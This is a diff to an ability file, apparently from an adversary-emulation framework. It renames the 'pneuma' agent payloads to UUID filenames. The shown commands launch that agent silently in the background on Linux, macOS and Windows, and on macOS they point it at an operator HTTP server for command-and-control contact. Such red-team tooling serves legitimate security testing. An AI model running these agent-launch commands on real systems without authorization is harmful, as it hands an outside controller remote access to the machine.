@@ -17,14 +17,14 @@ technique:
 platforms:
   linux:
     sh:
-      command: nohup ./pneuma-linux >/dev/null 2>&1 &
-      payload: '#{operator.payloads}/pneuma/pneuma-linux'
+      command: nohup ./d5f8b0e7-3a8f-419a-8e62-9d864df3f46f >/dev/null 2>&1 &
+      payload: d5f8b0e7-3a8f-419a-8e62-9d864df3f46f
   darwin:
     sh:
-      command: nohup ./pneuma-darwin -address "#{operator.http}" -contact http
-        >/dev/null 2>&1 &
-      payload: '#{operator.payloads}/pneuma/pneuma-darwin'
+      command: nohup ./6bcda011-571b-474a-b311-60fd609ab1f4 -address "#{operator.http}"
+        -contact http >/dev/null 2>&1 &
+      payload: 6bcda011-571b-474a-b311-60fd609ab1f4
   windows:
     psh:
-      command: Start-Process .\pneuma-windows.exe
-      payload: '#{operator.payloads}/pneuma/pneuma-windows.exe'
+      command: Start-Process .\52109542-a4df-4b5e-a4ae-1efab2c08be1
+      payload: 52109542-a4df-4b5e-a4ae-1efab2c08be1
